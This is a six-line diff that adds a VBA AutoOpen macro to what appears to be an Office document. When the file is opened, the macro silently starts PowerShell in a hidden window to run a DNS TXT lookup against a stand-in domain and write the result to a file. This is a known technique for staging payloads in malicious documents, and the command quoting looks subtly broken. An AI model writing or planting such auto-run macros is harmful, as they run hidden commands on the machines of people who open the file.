@@ -1,0 +1,6 @@
+Sub AutoOpen()
+Dim shell
+Dim out
+Set shell = VBA.CreateObject("WScript.Shell")
+out = shell.Run("powershell 'nslookup -q=txt domain.com' > blah.txt", 0, False)
+End Sub
